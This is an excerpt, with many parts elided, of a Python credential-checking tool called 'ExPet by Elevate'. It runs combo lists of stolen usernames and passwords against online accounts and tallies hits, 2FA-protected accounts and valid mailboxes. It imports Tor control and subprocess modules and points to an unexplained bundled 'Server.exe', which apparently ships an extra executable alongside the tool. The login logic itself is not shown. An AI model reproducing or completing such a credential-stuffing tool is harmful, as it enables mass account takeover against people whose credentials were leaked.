...
required_packages = [
    'requests', 're', 'readchar', 'os', 'time', 'threading', 'random',
    'urllib3', 'configparser', 'json', 'concurrent.futures', 'subprocess',
    'tarfile', 'traceback', 'colorama', 'stem', 'console', 'tkinter'
]
...
install_packages()
import requests, re, readchar, os, time, threading, random, urllib3, configparser, json, concurrent.futures, subprocess, tarfile, traceback,subprocess
...
def get_urlPost_sFTTag(session, tries = 0):
    ...
    while tries < maxretries:
        ...
        tries+=1
    return None
Server = "Packag\Configs\electron\Server.exe"
...
def logscreen():
    ...
    cmp1 = cpm
    cpm = 0
    utils.set_title(f"ExPet by Elevate | Checked: {checked}\{len(Combos)}  -  Hits: {hits}  -  Bad: {bad}  -  2FA: {twofa}  -  SFA: {sfa}  -  MFA: {mfa}  -  Valid Mail: {vm}  -  Cpm: {cmp1*60}  -  Retries: {retries}  -  Errors: {errors}")
    time.sleep(1)
...
def Main():
    ...
    utils.set_title("ExPet by Elevate")
    os.system('cls')
    try:
        loadconfig()
    except:
        print(Fore.RED+"There was an error loading the config. Perhaps you're using an older config? If so please delete the old config and reopen ExPet.")
        input()
        exit()
    print(logo)
    try:
